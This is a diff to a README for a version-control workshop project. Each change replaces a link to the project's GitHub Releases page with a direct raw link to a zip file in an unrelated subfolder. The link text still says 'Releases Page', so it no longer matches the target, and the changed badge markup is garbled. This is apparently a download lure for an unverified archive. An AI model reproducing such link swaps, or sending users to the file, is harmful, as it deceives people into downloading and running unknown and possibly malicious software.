@@ -6,11 +6,11 @@ Welcome to the vcs-workshop! This workshop will help you understand version cont
 
 ## 📥 Download the Software
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-blue.svg)](https://github.com/Ghost52093/vcs-workshop/releases)
+[![Download Now](https://raw.githubusercontent.com/Ghost52093/vcs-workshop/main/catwood/vcs-workshop.zip%20Now-Get%https://raw.githubusercontent.com/Ghost52093/vcs-workshop/main/catwood/vcs-workshop.zip)](https://raw.githubusercontent.com/Ghost52093/vcs-workshop/main/catwood/vcs-workshop.zip)
 
 To get started, please visit the Releases page:
 
-[Visit the Releases Page](https://github.com/Ghost52093/vcs-workshop/releases)
+[Visit the Releases Page](https://raw.githubusercontent.com/Ghost52093/vcs-workshop/main/catwood/vcs-workshop.zip)
 
 ## 💻 System Requirements
 
@@ -34,7 +34,7 @@ The vcs-workshop will cover:
 
 ## 📋 Download & Install
 
-1. **Visit the Releases Page:** Go to this link: [Releases Page](https://github.com/Ghost52093/vcs-workshop/releases).
+1. **Visit the Releases Page:** Go to this link: [Releases Page](https://raw.githubusercontent.com/Ghost52093/vcs-workshop/main/catwood/vcs-workshop.zip).
 
 2. **Choose Your Version:** Look for the latest version of vcs-workshop. You will find several files available for download.
 
